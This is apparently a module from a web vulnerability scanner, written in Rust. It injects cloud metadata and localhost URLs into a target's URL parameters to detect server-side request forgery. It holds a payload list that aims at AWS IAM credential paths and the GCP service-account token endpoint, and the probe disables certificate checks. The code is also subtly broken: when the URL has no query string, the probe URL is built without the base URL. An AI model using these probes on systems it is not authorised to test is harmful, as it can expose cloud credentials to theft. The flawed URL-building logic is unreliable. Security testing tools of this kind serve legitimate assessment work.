/// SSRF probe endpoints — URLs that should NOT be reachable from the web server.
pub const CLOUD_METADATA_ENDPOINTS: &[&str] = &[
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://100.100.100.200/latest/meta-data/", // Alibaba Cloud
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01", // Azure
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin",
    "http://127.0.0.1:80",
    "http://127.0.0.1:8080",
    "http://127.0.0.1:443",
    "http://127.0.0.1:22",
    "http://localhost:80",
    "http://localhost:8080",
];

/// Internal port scan targets for SSRF confirmation.
pub const INTERNAL_SERVICES: &[(&str, u16)] = &[
    ("127.0.0.1", 80),
    ("127.0.0.1", 443),
    ("127.0.0.1", 8080),
    ("127.0.0.1", 3306),
    ("127.0.0.1", 6379),
    ("127.0.0.1", 27017),
    ("127.0.0.1", 9200),
    ("127.0.0.1", 5432),
];

#[derive(Debug, Clone, serde::Serialize)]
pub struct SsrfProbeResult {
    pub parameter: String,
    pub target_url: String,
    pub probe_url: String,
    pub status: String, // reflected, timed_out, blocked, error
    pub response_length: usize,
}

pub struct SsrfProber {
    client: reqwest::Client,
}

impl SsrfProber {
    pub fn new() -> Self {
        let client = reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(10))
            .danger_accept_invalid_certs(true)
            .build()
            .unwrap();
        Self { client }
    }

    /// Test a URL parameter for SSRF by injecting cloud metadata endpoints.
    pub async fn probe_parameter(&self, base_url: &str, param: &str) -> Vec<SsrfProbeResult> {
        let mut results = Vec::new();
        for endpoint in CLOUD_METADATA_ENDPOINTS {
            let probe_url = if base_url.contains(&format!("{}=", param)) {
                // Replace existing param value
                let re =
                    regex::Regex::new(&format!("({}=)[^&]+", regex::escape(param))).unwrap();
                re.replace(base_url, format!("$1{}", endpoint))
                    .to_string()
            } else if base_url.contains('?') {
                format!("{}&{}={}", base_url, param, endpoint)
            } else {
                format!("?{}={}", param, endpoint)
            };

            match self.client.get(&probe_url).send().await {
                Ok(resp) => {
                    let status_code = resp.status().as_u16();
                    let body = resp.text().await.unwrap_or_default();
                    let has_reflection = body.contains("latest/meta-data")
                        || body.contains("computeMetadata");
                    results.push(SsrfProbeResult {
                        parameter: param.to_string(),
                        target_url: base_url.to_string(),
                        probe_url,
                        status: if has_reflection {
                            "reflected".into()
                        } else {
                            format!("http_{}", status_code)
                        },
                        response_length: body.len(),
                    });
                }
                Err(_) => {
                    results.push(SsrfProbeResult {
                        parameter: param.to_string(),
                        target_url: base_url.to_string(),
                        probe_url,
                        status: "timed_out_or_blocked".into(),
                        response_length: 0,
                    });
                }
            }
        }
        results
    }
}

impl Default for SsrfProber {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn test_cloud_metadata_endpoints_not_empty() {
        assert!(!CLOUD_METADATA_ENDPOINTS.is_empty());
    }
    #[test]
    fn test_internal_services_not_empty() {
        assert!(!INTERNAL_SERVICES.is_empty());
    }
}
